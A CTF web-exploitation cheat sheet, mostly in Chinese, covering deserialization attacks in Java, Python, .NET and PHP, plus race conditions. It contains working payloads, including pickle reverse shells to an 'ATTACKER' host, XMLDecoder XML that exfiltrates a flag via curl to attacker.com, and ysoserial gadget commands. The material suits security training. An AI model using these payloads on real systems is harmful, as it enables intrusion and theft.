# CTF Web - Deserialization & Execution Attacks

核心注入攻击（SQLi、SSTI、SSRF、XXE、命令注入）参见 [server-side.md](server-side.md)。

## Table of Contents
- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
- [Python Pickle Deserialization](#python-pickle-deserialization)
- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
- [Java XMLDecoder Deserialization RCE (HackIM 2016)](#java-xmldecoder-deserialization-rce-hackim-2016)
- [.NET JSON TypeNameHandling Deserialization (DefCamp 2017)](#net-json-typenamehandling-deserialization-defcamp-2017)
- [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
- [PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)](#php-soapclient-crlf-ssrf-via-__call-deserialization-n1ctf-2018)
- [Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)](#java-tiedmapentry--lazymap--reflection-hashmap-patch-trend-micro-2018)
- [Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)](#werkzeug-securecookie-pickle-rce-after-secret_key-leak-csaw-2018-finals)
- [PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)](#php-unserialize--double-url-encoding-curl-lfi-fireshell-ctf-2019)
- [Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)](#python-pickle-rce-wrapped-in-rot13base64-tamuctf-2019)

---

## Java Deserialization (ysoserial)

**模式：** Java 应用对不可信输入调用 `ObjectInputStream.readObject()`。序列化对象常见于 cookie、POST body 或 ViewState（通常为 base64，前缀是 `rO0AB` 或十六进制 `aced0005`）。

**识别：**
- 对可疑 blob 做 Base64 解码，Java 序列化数据以魔数 `AC ED 00 05` 开头
- 在源码中搜索 `ObjectInputStream`、`readObject`、`readUnshared`
- `Content-Type: application/x-java-serialized-object`
- Burp 插件：Java Deserialization Scanner

**关键点：** 反序列化会触发类路径上对象 `readObject()` 中的代码。如果存在 gadget chain（类链条），攻击者无需上传代码即可拿到 RCE。

```bash
# Generate payloads with ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser

# Common gadget chains (try in order):
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsBeanutils1 (Apache Commons BeanUtils)
# URLDNS (no execution — DNS callback for blind detection)
# JRMPClient (triggers JRMP connection)
# Spring1/Spring2 (Spring Framework)

# Blind detection via DNS callback (no RCE needed):
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64

# Send payload
curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.ser
```

**绕过过滤：**
- 如果 `ObjectInputStream` 子类对特定类做黑名单，尝试其他链
- `ysoserial-modified` 和 `GadgetProbe` 可用于枚举可用 gadget 类
- JNDI 注入（Java Naming and Directory Interface）：`java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI server
- 对 Java 17+（模块系统限制），优先找应用自身 gadget，或转向 Jackson/Fastjson 反序列化

---

## Python Pickle Deserialization

**模式：** Python 应用使用 `pickle.loads()`、`pickle.load()` 或 `shelve` 反序列化不可信数据。常见场景包括 Flask/Django session cookie、缓存对象、ML 模型文件（`.pkl`）和 Redis 中存放的对象。

**识别：**
- Base64 blob 中包含 `\x80\x04\x95`（pickle protocol 4）或 `\x80\x05\x95`（protocol 5）
- 源码里出现 `pickle.loads()`、`pickle.load()`、`_pickle`、`shelve.open()`、`joblib.load()`、`torch.load()`
- 使用 `pickle` 序列化器的 Flask session（而非默认 `json`）

**关键点：** Python 的 `pickle.loads()` 在反序列化对象时会调用 `__reduce__()`，其返回值可以是 `(os.system, ('command',))`，因此可直接 RCE。不存在安全的“不可信 pickle 反序列化”。

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# For reverse shell:
class RevShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))

# Using exec for multi-line payloads:
class ExecRCE:
    def __reduce__(self):
        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))
```

**绕过受限 unpickler：**
- `RestrictedUnpickler` 可能只允许部分模块，需通过允许的类继续链式调用
- 如果允许 `builtins`：可用 `(__builtins__.__import__, ('os',))` 再链到 `.system()`
- YAML 反序列化（未使用 `Loader=SafeLoader` 的 `yaml.load()`）也存在类似 RCE，可用 `!!python/object/apply:os.system`
- NumPy `.npy`/`.npz` 文件：`numpy.load(allow_pickle=True)` 会触发 pickle

---

## Race Conditions (Time-of-Check to Time-of-Use)

**模式：** 服务端先检查条件（余额、用户名唯一性、优惠券有效性），再在后续步骤执行动作。并发请求落在检查与执行之间时，可绕过验证。

**关键点：** 同时发送完全相同的请求。服务端会对所有请求读取同一个“修改前”状态，随后再统一写入，因此每个请求都看到旧值。

```python
import asyncio, aiohttp

async def race(url, data, headers, n=20):
    """Send n identical requests simultaneously"""
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(race('http://target/api/transfer',
    {'to': 'attacker', 'amount': 1000},
    {'Cookie': 'session=...'},
    n=50))
```

**常见 CTF 竞态目标：**
- **双花 / 余额绕过：** 转账或购买接口先检查 `if balance >= amount`，并发 50 次，全部看到原始余额
- **优惠券 / 兑换码复用：** 单次使用码先校验、后标记，用并发在标记前重复兑换
- **注册唯一性：** `if not user_exists(name)` 后再创建，同名并发注册可能覆盖已有账号（如劫持 admin）
- **文件上传 + 使用：** 上传后先校验再移动；可在校验前访问文件，或在校验与删除之间利用

```bash
# Turbo Intruder (Burp) — most reliable for precise timing
# Or use curl with GNU parallel:
seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
```

**源码中的识别点：**
- 没有锁或事务的非原子 read-then-write 模式
- `SELECT ... UPDATE` 未配合 `FOR UPDATE` 或串行化隔离级别
- 文件操作里先 `if os.path.exists()` 再 `open()`（经典 TOCTOU）
- Redis 使用 `GET` 后再 `SET`，却没有 `WATCH`/`MULTI`

---

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

**模式：** 去掉第一个 payload 的 STOP opcode（`\x2e`），再拼接第二个 payload，可在一次 `pickle.loads()` 中串联多个 pickle 操作。

**关键点：** Pickle VM 会顺序执行指令。移除第一个序列化对象的 STOP 后，反序列化器会继续执行第二个 payload 的 `__reduce__()`。再配合 `os.dup2()` 将 stdout 重定向到 socket FD，就能把 `os.system()` 的输出回传到网络连接。

```python
import pickle, os

class Redirect:
    def __reduce__(self):
        return (os.dup2, (5, 1))  # Redirect stdout to socket fd 5

class Execute:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

# Strip STOP opcode from first payload, concatenate second
payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
```

**适用场景：** 远程 pickle 反序列化能执行命令但不回显时。先链 `dup2` 重定向 stdout/stderr，再执行命令。

---

## Java XMLDecoder Deserialization RCE (HackIM 2016)

Java 的 `XMLDecoder` 会根据 XML 输入自动实例化类并调用方法。可直接构造 XML 来执行任意命令：

```xml
<object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
    </array>
  </void>
</object>
```

**关键点：** 与二进制 Java 反序列化不同，`XMLDecoder` 提供了一个基于文本、无需 gadget chain 的直接 RCE 路径。

---

## .NET JSON TypeNameHandling Deserialization (DefCamp 2017)

**模式：** Json.NET（Newtonsoft.Json）在启用 `TypeNameHandling.All` 或 `TypeNameHandling.Objects` 时，会根据 `$type` 字段实例化任意类。若可将 `$type` 指向已加载程序集中的高权限类，攻击者就可能执行任意代码或访问受保护功能。

```csharp
// Vulnerable server-side code:
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // UNSAFE: deserializes $type field
};
var obj = JsonConvert.DeserializeObject(userInput, settings);
```

```json
// Basic injection — instantiate a class with a dangerous constructor/property:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c calc.exe"
    }
  }
}
```

```json
// Simpler: inject a custom application class to escalate privileges:
{
  "$type": "MyApp.Models.AdminCommand, MyApp",
  "Action": "ReadFlag",
  "TargetPath": "/flag.txt"
}
```

```python
import requests, json

# Target: endpoint deserializing JSON with TypeNameHandling.All
payload = {
    "$type": "MyApp.Commands.ExecuteCommand, MyApp",
    "Command": "cat /flag"
}

r = requests.post("http://target/api/process",
                  json=payload,
                  headers={"Content-Type": "application/json"})
print(r.text)
```

**用于 RCE 的 gadget chain（ysoserial.net）：**
```bash
# Generate Json.NET payload with ysoserial.net:
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
# Common gadgets: ObjectDataProvider, WindowsIdentity, ActivitySurrogateSelector
```

**识别：** .NET/ASP.NET 应用接收 JSON。若服务端响应中也带 `$type`，或报错里出现 Newtonsoft.Json 栈信息，通常是明显信号。

**关键点：** Json.NET 的 `$type` 可以实例化已加载程序集中的任意类。只要类的构造函数、隐式转换或可写属性带副作用，就构成攻击面。可用 `ysoserial.net` 枚举现成 gadget。防御方式是使用默认的 `TypeNameHandling.None`，并配合自定义 `ISerializationBinder` 白名单。

---

## PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)

**模式：** 序列化后的字符串过滤把 `where`（5 字节）替换为 `hacker`（6 字节），导致序列化字符串长度与实际字节数不一致。长度字段仍写 N，但过滤后实际更长，于是 PHP 反序列化器会越过原本边界，把攻击者控制的数据当作后续序列化字段解析。

```php
// The target payload to inject as a serialized field:
$payload = '";}s:5:"photo";s:10:"config.php";}';
// Repeat "where" enough times so the expansion (5->6 per word) overflows
// by exactly strlen($payload) bytes:
$_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
```

**过程：**
1. 应用先把输入序列化为 `s:170:"wherewhere...PAYLOAD";`
2. 过滤器把每个 `where`（5）替换成 `hacker`（6），每次多 1 字节
3. 替换后实际字符串长于序列化长度字段
4. PHP 反序列化器只读取 `s:170:` 指定的字节数，随后把注入的 `";}s:5:"photo";s:10:"config.php";}` 解析为下一个字段

**关键点：** 任何发生在 `serialize()` 之后、存储或 `unserialize()` 之前的字符串扩展/收缩，都可能制造可利用的长度错位，从而形成对象注入。重点找那些在 `serialize()` 后又做词语过滤、审查或替换的代码。

---

### PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)

**模式：** PHP 反序列化 `SoapClient` 对象后，如果代码对其调用不存在的方法，会触发 `__call()` 并发起 HTTP 请求。若 `uri` 参数可注入 CRLF，就能向 localhost 构造任意 HTTP 请求（SSRF）。因此，任何“反序列化 sink + 方法调用”都可能升级为完整 SSRF 原语。

**过程：**
1. 攻击者构造带有 CRLF 注入 `uri` 参数的序列化 `SoapClient`
2. 应用通过 `unserialize()`、session handler 或其他反序列化 sink 载入该对象
3. 只要代码对这个对象调用任意未定义方法，就会触发 `__call()`
4. `SoapClient` 向 `location` 发送 HTTP 请求，而 `uri` 中的注入内容可携带伪造头和请求体

```php
$p = array(
    'uri' => "http://127.0.0.1/\r\nContent-Length:0\r\n\r\nPOST /index.php?action=login HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID=XXX\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nusername=admin&password=nu1ladmin&code=XXX\r\n\r\nPOST /foo\r\n",
    'location' => 'http://127.0.0.1/'
);
$soap = new SoapClient(null, $p);
// When getcountry() called on deserialized object -> triggers __call() -> sends crafted HTTP
```

```python
import requests

# Generate the serialized SoapClient payload
# The CRLF in uri smuggles a complete second HTTP request
php_serialize_script = '''
<?php
$target = "http://127.0.0.1/";
$post_body = "username=admin&password=nu1ladmin&code=XXX";
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=target_session_id'
);
$payload = array(
    'uri' => "http://127.0.0.1/\\r\\nContent-Length:0\\r\\n\\r\\nPOST /index.php?action=login HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n" . implode("\\r\\n", $headers) . "\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: " . strlen($post_body) . "\\r\\n\\r\\n" . $post_body . "\\r\\n\\r\\nPOST /foo\\r\\n",
    'location' => $target
);
echo serialize(new SoapClient(null, $payload));
?>
'''

# The serialized payload is then injected into the deserialization sink
# e.g., via session manipulation, cookie injection, or POST parameter
```

**常见触发链：**
```text
unserialize(user_input) → $obj->anyMethod() → SoapClient::__call() → HTTP request
session_start() with custom handler → SoapClient in session → __call() on access
```

**关键点：** PHP 的 `SoapClient::__call()` 在调用未定义方法时会主动发 HTTP 请求。若 URI 支持 CRLF 注入，就能 smuggle 完整 HTTP 请求，对 localhost 发起带认证上下文的 SSRF。它尤其适合与其他 PHP 反序列化向量（session handler、`phar://` wrapper）组合，因为 `SoapClient` 是内置类，不依赖额外库。重点找“反序列化对象后又对其调用方法”的路径。

---

## Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)

**模式：** 一个自定义 Java gadget chain，不依赖现成 ysoserial gadget，而是直接调用静态方法 `Flag.getFlag()`。链条使用 `TiedMapEntry` 包装 `LazyMap`，其 factory 为 `ChainedTransformer(ConstantTransformer(Flag.class), InvokerTransformer("getMethod", ...), InvokerTransformer("invoke", ...))`。由于 `LazyMap` 在序列化完成前一旦执行 `get()` 就会触发 factory，payload 必须在构造完成后，再把 `TiedMapEntry` 偷渡进父级 `HashMap`，具体通过反射写 `HashMap.table` 实现。

```java
// Build the transformer chain (classic Commons Collections)
Transformer[] chain = new Transformer[] {
    new ConstantTransformer(Flag.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getFlag", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
};
Map inner = LazyMap.decorate(new HashMap(), new ChainedTransformer(chain));
TiedMapEntry entry = new TiedMapEntry(inner, "trigger");

// Wrap in HashMap WITHOUT triggering LazyMap resolution:
HashMap<Object, Object> outer = new HashMap<>();
outer.put("placeholder", "x");            // force allocation of table[]
Map.Entry[] table = (Map.Entry[]) Whitebox.getInternalState(outer, "table");
table[0] = new HashMap.Node(0, "payload", entry, null);
Whitebox.setInternalState(outer, "table", table);

// Serialize and send
ByteArrayOutputStream out = new ByteArrayOutputStream();
new ObjectOutputStream(out).writeObject(outer);
byte[] payload = out.toByteArray();
```

**关键点：** Commons Collections 的 `LazyMap` + `ChainedTransformer` 不只能打 `Runtime.exec`，也能调用任意静态方法。当题目额外提供 `Flag.getFlag()` 之类辅助方法，期望 JVM 访问控制阻止你时，同一套 gadget 一样可以直接调用它。难点在于：若在构造 `HashMap` 时直接 `outer.put(payload, "x")`，会提前解析 `LazyMap`，导致在本地构造阶段就触发。正确做法是先把 `HashMap` 填充好，再通过反射（如 PowerMock 的 `Whitebox.setInternalState`，或原生 `Field.setAccessible(true)`) 把 `TiedMapEntry` 写进 `HashMap.table`。

**References:** Trend Micro CTF 2018 — Raimund Genes Cup Misc 300, writeup 11293

---

## Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)

**模式：** `werkzeug.contrib.securecookie.SecureCookie` 用 `pickle` 序列化 session 数据。一旦 Flask 的 `SECRET_KEY` 泄露（例如 SSRF 读取 `/proc/self/environ`），攻击者就能重新签名任意 cookie，使 `__reduce__` gadget 在反序列化时执行。

```python
import pickle, subprocess
from werkzeug.contrib.securecookie import SecureCookie

class Pwn:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))

cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
# Set Cookie: session=<cookie> and read the flag from the response
```

**关键点：** 任何把 `pickle` 与 HMAC 签名 cookie 混用的框架，只要 `SECRET_KEY` 泄露，就离 RCE 只差一步。Flask 默认的 `itsdangerous` 用的是 JSON，但旧应用使用 `SecureCookie` 或自定义 signer 时，仍常见到 pickle。

**References:** CSAW 2018 Finals — NekoCat, writeups 12130, 12144

---

## PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)

**模式：** 某 PHP 端点对 `$_GET['gg']` 做 `unserialize()`，而 gadget 的 `__destruct()` 会调用 `doit()`，再由它对 `$this->url` 发起 `curl`。黑名单用 `strpos($this->url, $ext)` 阻止 `.php`/`.txt`/`.html`，但 PHP 在 `unserialize` 前会先对 query string 解码一次，因此双重 URL 编码（如 `%252e` 表示 `.`）在第一次解码后仍是字面 `%2e`，能绕过 `strpos`；随后 curl 再解码一次时，文件路径恢复为真实扩展名并被读取。

```php
class SHITS {
    private $url    = "file:///var/www/html/config.php";
    private $method = "doit";
    private $addr; private $host; private $name;
}
// Replace '.' with '%252e' AFTER serialize(), then fix the string length.
// "file:///var/www/html/config.php" (31) -> "file:///var/www/html/config%252ephp" (35 bytes on the wire,
// 33 chars after the first decode), so set s:33 in the serialized blob.
print str_replace('.', '%252e', urlencode(serialize(new SHITS)));
```
```http
GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7B...s%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22...%7D
```

**关键点：** 过滤逻辑若在 URL decode 之前执行，而下游组件还会再次解码，双重编码 payload 就能绕过基于文本的黑名单。对于 PHP `unserialize`，还要确保 `s:<len>` 的长度是 PHP 第一次解码后的字节数（这里是 33，而不是 31 或 35），否则对象会静默反序列化失败。

**References:** FireShell CTF 2019 — Vice, writeup 13221

---

## Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)

**模式：** 备份/恢复端点用 `pickle` 对 Python 对象做 round-trip，但外面再包一层 `rot13(base64(pickle.dumps(obj)))` 试图隐藏格式。这层包装并不改变可利用性；只需在发送 `__reduce__` payload 前按相反顺序还原编码即可：

```python
import base64, codecs, pickle, subprocess

def make_backup(obj):
    s = base64.b64encode(pickle.dumps(obj)).decode()
    return codecs.encode(s, 'rot-13')

def parse_backup(blob):
    s = codecs.decode(blob, 'rot-13')
    return pickle.loads(base64.b64decode(s))

class RunBinSh:
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh',),))

print(make_backup(RunBinSh()))
# -> tNAwp3IvpUWiL2Im... paste into the "Load your backed up list" prompt
```
把输出交给应用的导入端点；反序列化时 pickle 会实例化 `subprocess.Popen(('/bin/sh',))`，从而得到 shell。

**关键点：** ROT13、hex、zlib、XOR 这类“混淆层”不会改变 pickle 的安全模型，只需把逆变换串起来即可。识别方法是对已知值做 round-trip（例如本地编码一个空列表，再与服务端输出比对）；凡是逐字节 1:1 映射，本质都是容易逆向的替换层。

**References:** TAMUctf 2019 — VeggieTales, writeup 13424

---
